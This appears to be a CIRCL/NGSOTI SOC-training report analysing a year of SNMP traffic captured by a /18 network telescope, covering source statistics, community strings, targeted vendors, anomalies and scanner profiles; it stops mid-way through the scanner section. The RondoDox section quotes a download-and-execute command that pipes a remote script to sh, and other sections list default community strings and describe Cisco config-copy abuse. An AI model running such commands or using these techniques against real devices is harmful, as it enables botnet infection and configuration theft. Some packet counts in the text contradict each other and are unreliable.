---
tags: ngsoti
title: "NGSOTI \\ Project: 101127921 \\ DIGITAL-ECCC-2022-CYBER-03 \\ Learning from large-scale IPv4 blackhole:<br> \\ Behavioral analysis of SNMP traffic"
page-title: "Project: 101127921 — NGSOTI — DIGITAL-ECCC-2022-CYBER-03"
author: [Team CIRCL/NGSOTI]
date: "2025-11-30"
keywords: [threat intelligence, blackhole analysis, snmp]
titlepage: true
titlepage-logo-a: "./eu_template/logo-eufunded.png"
titlepage-logo-b: "./eu_template/logo-ngsoti.png"
titlepage-logo-c: "./eu_template/logo-circl.png"
logo-width: "42mm"
footnotes-pretty: true
toc-own-page: true
colorlinks: true
header-includes:
  - \usepackage[table]{xcolor}
  - \definecolor{lightgray}{gray}{0.95}
  - \let\OldLongtable\longtable
  - \let\OldEndLongtable\endlongtable
  - \renewenvironment{longtable}{\rowcolors{1}{white}{lightgray}\OldLongtable}{\OldEndLongtable}
---

\pagebreak
# Behavioral Analysis of SNMP traffic

## Disclaimer
  
Co-funded by the European Union. Views and opinions expressed are however those of the author(s) only and do not necessarily reflect those of the European Union or the European Cybersecurity Competence Centre. Neither the European Union nor the granting authority can be held responsible for them.

## Executive summary 

The missions of the european Project **NGSOTI** (Next Generation Security Operator Training Infrastructure), is to empower SOC operators and organisations across Europe with the knowledge, tools, and infrastructure needed to defend effectively against ever-evolving cyber threats. ([restena.lu](https://restena.lu/en/project/ngsoti)[^restena]). Within this scope the key objective of this report is to enhance SOC operator capabilities.

SOCs carry the crucial mission of monitoring cybersecurity events and escalating any incidents or detections of malicious activity. While the task may seem straightforward, it is in fact increasingly complex. Attackers continuously evolve their techniques, thereby forcing SOC analysts to keep adapting.  

These analysts are confronted with a dual challenge:

- On one hand, they must be versatile generalists, capable of responding across a wide spectrum of domains.
- On the other hand, the volume of alerts and information they must process frequently leads to cognitive fatigue.

This fatigue inevitably results in reduced alertness and motivation, which can lead to miss-detections of critical incidents.

Our network telescope analysis is aligned with the core ambition of NGSOTI: to develop an open-source training infrastructure powered by real-world data that equips future SOC operators with advanced capabilities in network-related alert handling, incident response, log analysis, security operations management, threat intelligence, and communication. ([restena.lu](https://restena.lu/en/project/ngsoti))

In this context, we target two complementary goals:
Primarly, it will provide key insights and enriched data that enable SOC teams to understand threats to be able to detect attacks with finer granularity.

Secondly , our goal is to reduce operator fatigue by optimising the knowledge of background noise . I will help improving alerts prioritisation improving vigilance and training of SOC analysts.

By pursuing these complementary objectives, we aim to enhance both SOC performance and training quality within the NGSOTI framework. This report examines the SNMP protocol interactions in depth and provides operators actionable insights derived from its analysis.


## Acknowledgements

We would like to express our gratitude to the RESTENA Foundation for providing the network infrastructure that made the creation of this dataset possible. We also thank the European Union for supporting the improvement of SOC operator training across Europe. Finally, we acknowledge the contributions and assistance of our project partners, whose support was essential to this work.

\pagebreak
# Analysis scope

This report is an analysis by CIRCL of traffic captured on his network telescope. This analysis is valuable for SOC operator training, as it helps them understand how SNMP works, how it can be abused, and how background noise on this protocol can affect visibility and detection. We focused on the Simple Network Management Protocol (SNMP). SNMP is a standardized protocol used for monitoring, managing, and configuring networked devices such as routers, switches, servers, and IoT devices. It enables network administrators to collect information about device performance, network traffic, and operational status, as well as to remotely control certain device parameters.

SNMP operates in a client-server model: managed devices run an SNMP agent that exposes management data, while a network management system (NMS) queries these agents or receives notifications (traps). Data is structured in the form of Object Identifiers (OIDs), which represent specific metrics such as CPU load, interface status, or memory usage. This Traffic is using UDP (Unified Datagram Protocol). Therefore thes traffic is interesting to analyse since it give relevant data even if no host are listening and responding to.

SNMP supports three versions:

- `v1` and `v2c`: Basic functionality with community strings for authentication, but limited security.

- `v3`: Adds cryptographic security with authentication and encryption.

## Dataset 

The dataset is an extract of the SNMP traffic captured by the network telescope collected by CIRCL from November 1st to October 31th, 2025. Each record of the dataset represents a single SNMP packet received by the network telescope. It includes packet reception timestamp, source and destination IPs, associated ports, SNMP version, SNMP query type, requested OIDs, community string (if applicable), and the reference pcap file. The network available in network telescope is a /18 containing 16382 IPv4 addresses, on a range which is only 1 bit away from a private RFC1918 range. 
This network allows not only to capture standard scanning and exploits activity but also to catch misconfigurations or "typo" traffic targeting nearby private network spaces. This dataset provides insights into automated scanning campaigns as well as opportunistic reconnaissance behavior observed during the last 12 months.

## Data lake setup

The SNMP traffic was extracted from raw pcaps files using [Suricata](https://https://suricata.io/) 7.0.3, an open-source network threat detection engine capable of parsing protocols in real time. Suricata generated structured metadata, including SNMP version, community strings, requested OIDs, source and destination IPs and ports, and timestamps.

Theses extracted metadata were ingested into [ClickHouse](https://clickhouse.com/) 25.9.3.1. Clickhouse is a high-performance columnar database optimized for analytical workloads. Since ClickHouse allows fast aggregation and querying of large datasets, it is ideal for statistical analysis of SNMP traffic, such as tracking scanning patterns, frequent OIDs, and temporal trends in probing activity. 


The final data lake contains the following structure; 

**THIS EXPORT SHOULD BE UPDATED ONCE IMPORT FINISHED**

```
    ┌─name──────┬─compressed_size─┬─uncompressed_size─┬──ratio─┐
 1. │ version   │ 18.75 MiB       │ 61.78 MiB         │    3.3 │
 2. │ file      │ 19.64 MiB       │ 4.49 GiB          │ 234.37 │
 3. │ dest_ip   │ 123.48 MiB      │ 468.34 MiB        │   3.79 │
 4. │ src_ip    │ 83.98 MiB       │ 436.18 MiB        │   5.19 │
 5. │ oids      │ 161.12 MiB      │ 1.67 GiB          │   10.6 │
 6. │ src_port  │ 45.64 MiB       │ 61.78 MiB         │   1.35 │
 7. │ rtype     │ 40.92 MiB       │ 422.14 MiB        │  10.32 │
 8. │ dest_port │ 525.22 KiB      │ 61.78 MiB         │ 120.44 │
 9. │ community │ 7.27 MiB        │ 214.04 MiB        │  29.44 │
10. │ timestamp │ 6.34 MiB        │ 123.55 MiB        │  19.48 │
    └───────────┴─────────────────┴───────────────────┴────────┘
```
* `version`, is the snmp version could be 1,2 or 3.
* `file` reference the pcap original file where the packet is stored
* `dest_ip` the destination ipv4
* `scr_ip` the source ipv4
* `oid` is an array of requested oids in the snmp frame
* `src_port` the udp source port
* `rtype` the type of SNMP request
* `dest_port` the udp destination port
* `Community` is the SNMP community string
* `timestamp` the timestamp of the data frame.

\pagebreak
## General Statistical analysis  

### SNMP Activity  
#### Methodology

We leveraged the volumetric information available in the data lake to quantify the activity associated with each source IP. To enrich this view, we correlated all source IP addresses with their corresponding BGP Autonomous Systems using network WHOIS data. for this and Country-level attribution we used the historical IP-to-ASN mapping service provided by the CIRCL D4 project, specifically the ([IPASN-History dataset](https://github.com/D4-project/IPASN-History)][^ipasn])


#### Results
The year-long analysis reveal that the IPv4 /18 sinkhole was contacted via SNMP by 153.045 distinct IPv4 sources, generating a total of 634.52 million SNMP queries. The diagram below illustrates the daily volume.

![SNMP Daily activity](http://hdoc.csirt-tooling.org/uploads/upload_b7dad7268e928773b19299dfcd84050c.png)

The frequency analysis highlights clear spikes of more than 3.5 millions of SNMP queries per day on the following dates:

– Late November 2024 and early October 2024  
– 14 January 2025  
– 2–3 June 2025  
– 29 October 2025  

### Country repartition  
To visualise the source of the snmp traffic we used two different criterias, packet volume and different ip volume per country. 

![Country repartition of SNMP requests](http://hdoc.csirt-tooling.org/uploads/upload_1de7bc8acfad183c9abbc596baf7b0ae.png)

Top 10 of total hits per country.


| Rank | Country | distinct IPs | total_packets |
|--|---------|--------------|------------|
|1| 	ID |	2383| 	248.491.546|
|2 |	CN| 	96762| 	243.813.326|
|3| 	PS| 	2 |	98.002.656|
|4| 	CL| 	4750 |	88.763.504|
|5| 	US| 	7088 |	85.706.798|
|6| 	DE| 	2829 |	71.712.610|
|7| 	CO| 	3255 |	33.193.630|
|8| 	BR| 	1057 |	27.132.990|
|9| 	RU| 	146 	|23.517.254|
|10| 	JP| 	977| 	22.577.496|



Many interesting informations are revealed by this output.  
- Indonesia is the first nation in term of packet emited just before China with 50x less source IP's.  
- Palestine emitted 98 Billions of packets using only two IP's. This behaviour is analysed in the chapter Anomalies Investigation / Palestinian traffic.  

![SNMP source IPv4 repartition](http://hdoc.csirt-tooling.org/uploads/upload_fd76d7e2e729a1ec0c599c10601d63d2.png)


| Rank | Country | Distinct IPs |
|--|---------|--------------|
0 |	CN 	|96762|
1 |	US 	|7088|
2 |	CL 	|4750|
3 	|IN |	4233|
4| 	CO 	|3255|
5 |	DE 	|2829|
6 	|SG |	2740|
7| 	SE 	|2495|
8 |	ID 	|2383|
9 	|TH |	1981|
10| 	MY |	1783|


![Packets sent by BGP AS](http://hdoc.csirt-tooling.org/uploads/upload_cab1ae04bb40e77a90fc700849a7536e.png)

Splitting the queries across BGP Autonomous System makes it possible to distinguish traffic originating from countries other than China, Indonesia, and Palestine. This analysis highlights additional countries that generate substantial volumes of SNMP traffic, such as Germany, Japan, Russia, Chile, and several others.

| Rank | Country | AS name | Packet send |
|:--|:-----|:----|-----:|
|1 |ID|QUANTUMNET</br>-AS-ID PT </br>Quantum Tera Network|143779568|
|2 |CN|CHINANET-BACKBONE No.31,</br>Jin-rong Street|133905880|
|3 |PS|PALTEL-AS PALTEL Autonomous System|98002656|
|4 |ID|GRAHANET-AS-ID </br>PT.Graha Telekomunikasi Indonesia|94598288|
|5 |DE|DTAG Internet service provider operations|45130112|
|6 |CN|CHINA169-BACKBONE CHINA UNICOM </br>China169 Backbone|31525886|
|7 |CL| Orbyta S.A.|31167900|
|8 |DE|LUENECOM-AS|18456158|
|9 |RU|PROVODOV_NET-AS|16996588|
|10 |JP| ASAHI-NET Asahi Net|16344656|
|11 |CO| Colombia Movil|15037450|
|12 |SE|TELENOR-SE former </br>Utfors Bredband AB & Telenor AB|14628176|
|13 |CN|CHINAMOBILE-CN </br>China Mobile Communications Group Co., Ltd.|14538808|
|14 |CN| CMNET-V4SHANGHAI-AS-AP </br>Shanghai Mobile Communications Co.,Ltd.|13641050|
|15 |JP|NETSURF-AS-|13194946|

It is more instructive to examine the traffic of BGP Autonomous System (AS) by distinct used IP source. This perspective reveals which networks owns the more IP's for the SNMP scanning activity. Beyond major operators such as ChinaNet Backbone N31 and hosting providers like DigitalOcean, a significant portion of the traffic originates from mobile networks and domestic netwok operator. Many of these AS appear to rely on ORB nodes (Open Relay Boxes), which are commonly used to conduct large-scale distributed scanning. Examples include HI3G, COMUNICACIÓN CELULAR S.A., Comcel S.A., and several others.

![Source IP per BGP AS](http://hdoc.csirt-tooling.org/uploads/upload_7a969f40dbe65c71946f739e7c4a5515.png)


| Rank | AS name | Distinct IPs |
|:-|:---------:|-----------:|
| 1 | CHINANET-BACKBONE No.31,Jin-rong Street |6219|
| 2 | DIGITALOCEAN-ASN |2419|
| 3 | HI3G |2136|
| 4 | TELEFONICA CHILE S.A. |1723|
| 5 | ENTEL CHILE S.A. |1678|
| 6 | CHINA169-BACKBONE CHINA UNICOM China169 Backbone |1511|
| 7 | BHARTI-MOBILITY-AS-AP Bharti Airtel Ltd. AS for GPRS Service |1327|
| 8 | ALPHASTRIKE-RESEARCH |1268|
| 9 | AKAMAI-LINODE-AP Akamai Connected Cloud |1262|
| 10 | COMUNICACION CELULAR S.A. COMCEL S.A. |1230|
| 11 | DTAG Internet service provider operations |1073|
| 12 | VIL-AS-AP Vodafone Idea Ltd |1033|
| 13 | CHINAMOBILE-CN China Mobile Communications Group Co., Ltd. |918|
| 14 | TELKOMNET-AS-AP PT Telekomunikasi Indonesia |853|
| 15 | WATANIYATELECOM-AS |783|

### SNMP version repartition

#### Methodology

The methodology used to produce the SNMP version repartition is straightforward: each SNMP packet observed in the sinkhole traffic, whether it is a request, response, or a trap, is parsed to extract the SNMP version field. All captured frames containing SNMP data are processed individually, and the version identifiers are aggregated to compute their distribution. This ensures that the graph reflects an accurate representation of the protocol versions present in the observed background noise.

#### Results

![SNMP Queries version repartition](http://hdoc.csirt-tooling.org/uploads/upload_1c3a3cfe92d8a86c3c05685f615e14b5.png)


The final dataset contains  634.52 million of SNMP packets. The analysis of SNMP versions shows that only about 2% of queries use SNMPv3. This low adoption is expected here, as SNMPv3 secures the communication channel through authentication and encryption, making it less attractive for uncontrolled scanning activities. In contrast, SNMPv1 and SNMPv2c are simple, weak, and widely deployed, and their lack of security controls allows unauthorized actors to retrieve information easily. As a result, these legacy versions constitute the overwhelming majority of the background scanning traffic observed.  

### SNMP Community

#### Methodology

The methodology for this representation consists of extracting SNMP community strings from all SNMP v1 and v2c packets present in the dataset. These versions expose the community field in clear text, making it directly observable and suitable for statistical analysis. SNMPv3 packets were intentionally excluded from this extraction step, as their authentication and encryption mechanisms prevent community or credential data from being visible in clear text. The analysis is thus limited to v1 and v2c, where the community string is present and readable in every captured frame. Empty SNMP community is redacted as 'Empty' for being visible in the cloudword.

#### Results

![SNMP v1 & v2c community string repartition](http://hdoc.csirt-tooling.org/uploads/upload_82860accc4a31f573ae71293228dc569.png)

Numerous community strings are expected when examining traffic generated for discovery-oriented scanning activities.

* PUBLIC, is the historical default SNMP read only community.  
* [CANON_ADMIN](https://oip.manual.canon/USRMA-0219-zz-SS-enUS/contents/10040030.html)[^canon] is the documented default community for canon printers.    
* PRIVATE is also a commonly documented configuration for read write access. For example this configuration isn is with [Cisco](https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/7282-12.html)[^cisco] devices 

More interestingly, this highlights the presence of others community string 'internal' as well as numerous variants of 'public'. These observations provide insight into how commonly these weak or guessable strings are used across unsolicited SNMP traffic.

The following graph depict the relations between the snmp hardware and the requested v1 & v2c community. it cleardy demonstrate that beside public, there is a clear focus on certain OIDs for certain devices. This reveal abuse for default snmp community  however most of the non public ones discovered in this dataset are not documented

![Vendor OID to community](http://hdoc.csirt-tooling.org/uploads/upload_11101d641d33a0efe4a24a5d8541ed84.png)



### Devices scanned.

#### Methodology

To analyze the SNMP sinkhole dataset, we focus on the Object Identifiers (OIDs) queried by IP sources. Since each SNMP packet may contain multiple OIDs, we flatten the data to handle them individually. Some oids are common on each platform. It is important to understand that most OID requested in the network telescope are vendor agnostic since they are part of the common root of OID's. For example getting information about hostname could be achieved by looking at the oid [1.3.6.1.2.1.1.3.0](https://support.huawei.com/enterprise/en/doc/EDOC1100126900/861a99d5/obtaining-device-information-through-snmp-get)[^oid]


![SNMP OID Organisation](http://hdoc.csirt-tooling.org/uploads/upload_4d9f568f1dc5574a936d0e9d9aed253c.png)


However some of them are vendor related. We extracted the vendor-specific prefix of each OID, identified by the `1.3.6.1.4.1.x` pattern, where `x` corresponds to a particular vendor. By counting the frequency of queries for each vendor prefix and ranking them, we can identify which vendors’ devices are most commonly targeted or scanned. This methodology allows us to uncover trends in attacker behavior, highlight reconnaissance activity, and detect potential focus on specific device types in the wild.

#### Results

![Top queried vendors](http://hdoc.csirt-tooling.org/uploads/upload_a2a8dd2114935ec301d0aa2457df72e4.png)

![Yearly Vendor scan Coverage](http://hdoc.csirt-tooling.org/uploads/upload_1b407fd5c91c98bace3db198d3286ca3.png)

It is noteworthy that several device families do not exhibit continuous scanning activity throughout the year. For example, Cisco devices appear only between March and May 2025, while Lite-One Technology Corp. devices are observed from January through July. This irregularity suggests that scanning campaigns may be driven by factors other than broad, systematic reconnaissance.

It should be also noted that for now this scheme does not distriminate scans from misconfiguration.

A valuable follow-up investigation would be to examine whether publicly disclosed SNMP exploitation techniques, proof-of-concept releases, or newly identified SNMP-related vulnerabilities emerged during these same periods. Correlating vendor-specific scanning activity with vulnerability disclosure timelines could help determine whether the observed traffic aligns with opportunistic exploitation attempts or with more general background scanning activity.

\pagebreak
## Anomalies investigation

### Palestinian Traffic

According to the volumetry analysis the Palestinian Autonomous System 12975 have emited 41.8 millions of packets.
``` 
   ┌─ip────────────┬─as_number─┬─as_name────────────────────────────┐
1. │ 213.6.137.78  │     12975 │ PALTEL-AS PALTEL Autonomous System │
2. │ 213.6.173.227 │     12975 │ PALTEL-AS PALTEL Autonomous System │
   └───────────────┴───────────┴────────────────────────────────────┘
```

It appear that the traffic was only generated by the host 213.6.137.78
starting on 31th of December 2025 to the 19th of May. This IP did not have any PTR associated DNS records and is not known in our passive DNS database.

![Palestinian traffi over year](http://hdoc.csirt-tooling.org/uploads/upload_59ad770518dd8ba259a1787b7d56c991.png)

For each destination, two different scans are performed. Each scans are performed 3 times and retried every 3 seconds.

For the first type of scan, it do a SNMP get request and ask the following generic SNMP Oids;  
- 1.3.6.1.2.1.2.2.1 ifEntry  
- 1.3.6.1.2.1.4.20.1 ipAddrTable  
- 1.3.6.1.2.1.4.22.1 ipNetToMediaTable  
Then finally the unknown regitered vendor 9999 oid  
- 1.3.6.1.2.1.9999.1.1.6.4.1  
 
This scan may be related to microtiK os devices as [documented](https://fossies.org/linux/opennms/features/enlinkd/tests/src/test/resources/linkd/nms102/mikrotik-192.168.0.1-walk.txt)[^mikrotik] And seems to allows determination of internal IP's.  

```bash
snmpwalk [redacted] -v1 -c public 1.3.6.1.2.1.9999.1.1.6.4.1 | head
Error: OID not increasing: iso.3.6.1.2.1.9999.1.1.6.4.1.4.192.168.33.99
 >= iso.3.6.1.2.1.9999.1.1.6.4.1.4.172.31.33.144

iso.3.6.1.2.1.9999.1.1.6.4.1.4.192.168.33.99 = INTEGER: 2
iso.3.6.1.2.1.9999.1.1.6.4.1.4.172.31.33.144 = INTEGER: 2
```   

The second scan is also a SNMP get request on;

- 1.3.6.1.2.1.25.3.3.1.2 hrProcessorEntry
- 1.3.6.1.2.1.25.2.3.1.2 hrStorageEntry

For all the request, no payload are present.
 
![Example in c0bb49e788964718af4dfea4c0ab898c-2025-04-27-174644](http://hdoc.csirt-tooling.org/uploads/upload_2bef7e1c9efbcaf612703bb99a4cc4a8.png)

![Second example in c0bb49e788964718af4dfea4c0ab898c-2025-03-16-011212](http://hdoc.csirt-tooling.org/uploads/upload_1e581d01dfc76ae96bfe7a865755fe6c.png)

This recurrent schema is observable for all destination IP's.

### RondoDox campaing exploitation 

We detected linux raw commands exploitation on port 162. The command executed is;

```
echo;(wget -O- http://169.255.72.169/rondo.sh||busybox wget -O- http://169.255.72.169/rondo.sh||curl http://169.255.72.169/rondo.sh) | sh -s random.162;echo 
```

However this comment is abruptly spread in UDP without using the SNMP protocol at all. Adding to this the same injection send rawly on many IPs and UDP Ports.

![Command injection spread](http://hdoc.csirt-tooling.org/uploads/upload_6e93aa8511164a874005c1e6a9ef10e4.png)

This command try to download the file 'rondo.sh' using several methods ( wget, busybox integrated wget and curl). The file leads another [script](https://www.virustotal.com/gui/file/aa518f13570fa2eec0fc3a4dd5ff0a7438fff5491d6e0650c94520651b02f456/content)[^vt] still available trough ViruTotal plateform. This second script perform the final download of the payload adapted to the plateforme architecture.

Based on the name used, we could link this injection to a report of trendmicro. According to this, the injection may be related to a botnet deployement campaign named [RondoDox](https://www.trendmicro.com/en_us/research/25/j/rondodox.html
).[^rondodox]

The RondoDox campaign represents a large-scale botnet operation that systematically exploits more than fifty disclosed vulnerabilities across a broad range of internet-exposed devices from over thirty vendors. By employing a multi-exploit, high-volume probing strategy, the operators target routers, DVRs, NVRs and various CCTV systems, including vulnerabilities originally revealed through Pwn2Own competitions. In our case, however, the absence of identifiable headers or protocol information prevented any reliable association with a known CVE. This context underscores persistent risks linked to delayed IOT patching.


### CVE-2021-44228 (Log4J Vulnerability) scanning
    
On may the 19th, one Great Brittain source addresses (194.80.247.247) from the AS JANET Jisc Services Limited attempted Log4J execution probes. The injection not only targeted the SNMP ports, but attempts injection accross a wide range of ports. The activity is not operationally significant, it may demonstrates that actors may continue to test for legacy vulnerabilities. In this case, the scanner appears to be [Nessus](https://www.tenable.com/products/nessus)[^nessus]. and impacted many TCP and UDP ports. Finally related to SNMP the following Log4J injection was performed using both SNMP version 1 and 2c.

![CVE-2021-44228 injection](http://hdoc.csirt-tooling.org/uploads/upload_2e4089ae19621172fe6b80ce5cf01347.png)

### Cisco device backup exploitation

Cisco devices implement a mechanism that allows configuration backup to be trigered through SNMP using the CISCO-CONFIG-COPY-MIB (1.3.6.1.4.1.9.9.96). This capability is designed for administrative automation of configuration backup.

The MIB makes it possible to initiate a configuration backup because it exposes a dedicated management table named ccCopyTable, which defines all parameters required to copy configurations between internal device storage and an external repository. The process does not involve direct manipulation of the configuration text through SNMP queries; instead, it instructs the device to perform a managed copy operation.


in order to start a backup one should instantiate an Entry in ccCopyTable. The query should provide.


* Source of the configuration (e.g., running configuration),
* destination of the copy (e.g., a network file),
* Transfer protocol to be used (commonly TFTP)
* Filename used for backup
* Address of the external server that will receive the file.

![SNMP backup request](http://hdoc.csirt-tooling.org/uploads/upload_0e6ea6911ea1d9d48dab004f92c296c8.png)

Such behaviour was observed on these sources.

| Src_ip | Community |
| -------- | -------- | 
| 200.54.90.138|s0l4rw1ndsle |
| 200.54.90.138|ehealthle |
| 138.0.99.230|00deadbemf |

### SNMP Misconfigurations

Due to the proximity between our network telescope’s address space and an RFC1918 range, certain SNMP observations may contain artefacts resulting from device monitoring misconfiguration. The example below illustrates a Cisco device transmitting unsolicited SNMP traps.

![Cisco Switch Misconfig](http://hdoc.csirt-tooling.org/uploads/upload_97e93f726c1e0ba235e2e52614a3e632.png)

When examining additional protocols, we observe that the same device also emits SYSLOG messages, further confirming the misconfiguration. This mexican host belonging to AS 8151 named "UNINET" communicated with the network telescope from 21 February to 15 May 2025, inadvertently leaking internal information including IP addresses, operational status, software version, and the SNMP community string.

Many other such misconfiguration are present in the network telescope

![Network device misconfiguration](http://hdoc.csirt-tooling.org/uploads/upload_4072d0d9f3a72eb9d8b7c5ca606fdf49.png)


\pagebreak
## Scanning vendor Traffic
### Methodology
Given that no resolvable IP address or active service exists within the network telescope range, distinguishing commercial from institutional scanners becomes straightforward. This led us to investigate whether scanners misusing SNMP could be reliably identified; for many, a simple reverse-DNS (PTR) lookup was sufficient.

These lookups enabled us to refine and extend the relevant [MISP warning list](https://github.com/MISP/misp-warninglists)[^mispwl], thereby enhancing the situational awareness and operational capabilities of SOC teams. Over the course of the year, we identified the following scanners issuing SNMP queries.

Commercials;

- [Cencys](https://search.censys.io/) 96 Hosts 
- [Shodan](https://www.shodan.io/) 50 Hosts 
- [Onyphe](https://www.onyphe.io/) 32 Hosts 
- [Internet Census](https://www.internet-census.org/home.html) 440 Hosts 
- [Binary Edge](https://www.binaryedge.io/) 38 Hosts 
- [ShadowForce](https://shadowforce.io/) 465 Hosts 
- [Driftnet.io](https://internet-measurement.com/) 504 Hosts 
- [Modat.io](https://www.modat.io) 12 Hosts

Academics/Research;

- [Shadowserver](https://www.shadowserver.org/) 465 Hosts 

Questionnables scanners;

- [Stretchoid](https://stretchoid.com) 343 Hosts 
- [NetSecScan](http://netsecscan.net/) 16 Hosts 
- Internettl 61 Hosts 

For each group of detected scanners, we analyzed the OIDs queried by these scanners and the network footprint. We did not take in consideration Scanners that does not communicate in SNMP.

\pagebreak
### Results

We analysed exclusively the scanners issuing SNMP queries. With the exception of Internet Census, the observed scanners appear to perform only device fingerprinting. It must be noted, however, that the telescope network corresponds to a passive IP range. None of the queried OIDs returned any results, suggesting that the scanners may perhaps request additional OIDs depending on the devices they identify.

#### Censys
Censys is an Internet-wide scanning and asset-visibility platform operated from the United States. It continuously maps exposed services and helps organizations identify risks across their public-facing infrastructure. 

We identified 81 distinct IP addresses in our dataset whose Censys DNS-associated PTR records resolve to one of the following six entries:  
- scanner-001.hk2.censys-scanner.com   
- scanner-101.ch1.censys-scanner.com   
- scanner-011.ch1.censys-scanner.com  
- scanner-007.ch1.censys-scanner.com   
- scanner-11.ch1.censys-scanner.com  
- scanner-14.ch1.censys-scanner.com  

Additionnaly to these recors, 16 additionnal IP's respond to the PTR "unused-space.coop.net". We rely theses IP to Censys since all of these IPs are contained in the AS belonging to Censys (AS398324).
 
All Censys scanners observed were originate from ranges in two BGP AS;  

| AS | Range  | 
| -------- | -------- | 
| AS398324 | 167.94.138.0/24 |
| AS398324 | 66.132.153.0/24 |
| AS398424 | 162.142.125.0/24|
| AS398722 | 199.45.154.0/24 |
| AS398324 | 206.168.34.0/24 |

According to geolocation found following the IP route path, server are located in both Chicago (CH) and HongKong (HK)  

Traceroute for one example IP 66.132.153.154.

- 1. cifix-rnet.circl.lu (185.194.94.254)  
- 2. e0-1.core2.lux1.he.net (216.66.93.57)  
- 3. 100ge0-34.core2.bru1.he.net (184.104.194.110)  
- 4. 100ge0-78.core2.par2.he.net (184.104.193.137)  
- 5. port-channel8.core2.nyc4.he.net (72.52.92.166)  
- 6. port-channel18.core3.chi1.he.net (184.104.193.173)  
- 7. censys-inc.e0-22.switch7.chi1.he.net (184.105.45.218)  
- 8. scanner-101.ch1.censys-scanner.com (66.132.153.154)  

Additionnaly during the timeframe of observation, all IPs requests were using only SNMPv3 queries, which impair us to determine the queried OID and Community.  

![Censys SNMP Queries](http://hdoc.csirt-tooling.org/uploads/upload_fc6bc0ac648de6dcaa4feff3ccb16cec.png)

It should be mentionned that besides SNMP, a Single scanner scans for 74 other TCP ports and 12 other UDPs.

#### Shodan
Shodan is an Internet-wide search engine. Like Censys it identifies and indexes publicly reachable devices and services by scanning their exposed network banners. It is used to analyze global attack surfaces, study service deployments, and understand the security posture of connected systems.

From our network telescope data during this year timeframe, we found out that shodan used 46 different kind of PTR records for a total of 50 differents Ip's. All PTR could be sorted in two kind of records.

30 "Census" related PTR records. For example;  
- house.census.shodan.io  
- battery.census.shodan.io  
- flower.census.shodan.io  
- cloud.census.shodan.io  

16 "Scanf" related PTR records. For example;  
- pancake.scanf.shodan.io  
- biscuit.scanf.shodan.io  
- bacon.scanf.shodan.io  
- hashbrown.scanf.shodan.io  

Shodan seems to have a good worldwide spread of his scanners. It own scanners in network space of Digital Ocean (AS14061), BlackHost LDT (AS12989), CariNet, Inc (AS10439) and IP Volume Inc (AS202425) 

| AS | Range  | 
| -------- | -------- | 
|AS14061 |143.198.68.0/24 |
|AS14061 | 165.227.55.0/24 |
|AS14061 | 165.227.62.0/24 |
|AS12989 | 185.142.236.0/24 |
|AS12989 | 185.165.191.0/24 |
|AS12989 | 195.144.21.0/24 |
|AS12989 |86.54.31.0/24 |
|AS12989 |2.59.22.0/24 |
|AS14061 |64.227.90.0/24 |
|AS10439 | 66.240.219.0/24 |
|AS10439 |71.6.135.0/24 |
|AS10439 |71.6.146.0/24 |
|AS10439 |71.6.158.0/24 |
|AS10439 |71.6.199.0/24 |
|AS202425| 80.82.77.0/24 |
|AS202425|89.248.167.0/24 |
|AS202425| 89.248.172.0/24 |
|AS202425| 93.174.95.0/24 |
|AS202425| 94.102.49.0/24 |

Scanf host execute the following queries.

| community | oids | version |
|:----|:----|----:|
| public | 1.3.6.1.2.1.1.5.0 | 1 |
| *not visible* |  | 3 |

The SNMP v1 MIB is sysName, An administratively-assigned OID. By convention, this is the node's fully-qualified domain name. If the name is unknown, the value is the zero-length string. Again, the SNMP v3 query, impair us to determine the second queried OID and Community.  

Census hosts performed more OID request.

| community | oids | version |
|:-|:-|-:|
| public | 1.3.6.1.2.1.1.1.0 | 1 |
| public | 1.3.6.1.2.1.1.5.0 | 1 |
| public | 1.3.6.1.2.1.1.8.1 | 2 |
| | 1.3.6.1.2.1.1.3.0 |
| |1.3.6.1.2.1.1.5.0 |
| |1.3.6.1.2.1.1.4.0|
| |1.3.6.1.2.1.1.1.0
| |1.3.6.1.2.1.1.7.0
| |1.3.6.1.2.1.1.2.0
| |1.3.6.1.2.1.1.6.0
| |1.3.6.1.2.1.1.9.1.4.1
| |1.3.6.1.2.1.1.9.1.1.1
| |1.3.6.1.2.1.1.9.1.2.1
| |1.3.6.1.2.1.1.9.1.3.1 |  |
| *not visible* | | 3 |


Adding to the previous ones, we found again sysName (1.3.6.1.2.1.1.5.0) and also a SNMP v2 query containing 12 OID's request used to get device generic informations.  

- 1.3.6.1.2.1.1.8.1 / 2 – Part of sysORTable; operational status entries for system capabilities.
- 1.3.6.1.2.1.1.3.0 – sysUpTime; time since the device last rebooted.
- 1.3.6.1.2.1.1.5.0 – sysName; system hostname.
- 1.3.6.1.2.1.1.4.0 – sysContact; administrative contact information.
- 1.3.6.1.2.1.1.1.0 – sysDescr; full device description (model, OS, version).
- 1.3.6.1.2.1.1.7.0 – sysServices; bitmap of services the system provides (layers 1–7).
- 1.3.6.1.2.1.1.2.0 – sysObjectID; vendor/device identifier.
- 1.3.6.1.2.1.1.6.0 – sysLocation; physical location of the device.
- 1.3.6.1.2.1.1.9.1.4.1 – sysORUpTime; time since this OR entry was last instantiated.
- 1.3.6.1.2.1.1.9.1.1.1 – sysORIndex; index of an OR (Object Resource) entry.
- 1.3.6.1.2.1.1.9.1.2.1 – sysORID; OID identifying a supported MIB module.
- 1.3.6.1.2.1.1.9.1.3.1 – sysORDescr; description of the associated MIB module.



#### Onyphe
Onyphe is a French cyber-intelligence search engine that collects and correlates data from scans, open sources, and global observation points to analyze the exposure of connected systems. It is used to assess attack surfaces, identify potential compromises, and monitor threat activity.

Onyphe scans the following MIB;

| Community | OID | Version |
| -------- | --------         | -------- |
| public | 1.3.6.1.2.1.1.1.0|1|

This MIB is sysDescr, a textual description of the entity. This value should include the full name and version identification of the system's hardware.

From our network telescope data during this year timeframe, we found out that Onyphe used 32 Ip's with always the same PTR schema on the domain onyphe.net.

All these IP are located on his own AS213412 ONYPHE SAS or hosted at OVH AS16276 (91.134.185.0/24)

Onyphe hosts seems following the scheme: [name].probe.onyphe.net;  

For example;  
- barker.probe.onyphe.net  
- annemarie.probe.onyphe.net  
- douglas.probe.onyphe.net  
- josephine.probe.onyphe.net  
- ratcliffe.probe.onyphe.net  

#### Internet Census
The Internet Census Group is a research initiative led by BitSight Technologies, Inc. that regularly scans the public Internet to identify exposed systems and evaluate global security posture. 

Internet Census scan the following MIB

| community | oids | version |
|:---|:---|---:|
| a | 1.3.6.1.2.1.1.1.0|2|
